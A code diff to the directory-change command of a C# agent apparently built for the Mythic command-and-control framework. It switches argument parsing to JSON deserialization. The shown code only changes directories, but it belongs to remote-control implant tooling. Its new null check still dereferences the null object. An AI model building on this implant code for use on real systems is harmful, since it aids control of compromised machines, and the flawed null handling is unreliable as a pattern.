@@ -14,21 +14,16 @@ namespace Cerberus.Commands
 
         public override string Execute(MythicTask task)
         {
-            var Arguments = task.parameters.Split(' ');
-            string path;
+            var taskArgs = Encoding.UTF8.GetBytes(task.parameters).Deserialize<CdParam>();
 
-            if (Arguments is null || Arguments.Length == 0)
+            if (taskArgs is null || string.IsNullOrWhiteSpace(taskArgs.path))
             {
-                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-            }
-            else
-            {
-                path = Arguments[0];
+                taskArgs.path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             }
 
             try
             {
-                Directory.SetCurrentDirectory(path);
+                Directory.SetCurrentDirectory(taskArgs.path);
             }
             catch(Exception ex)
             {
@@ -37,5 +32,10 @@ namespace Cerberus.Commands
 
             return Directory.GetCurrentDirectory();
         }
+    }
+
+    public class CdParam
+    {
+        public string path { get; set; }
     }
 }
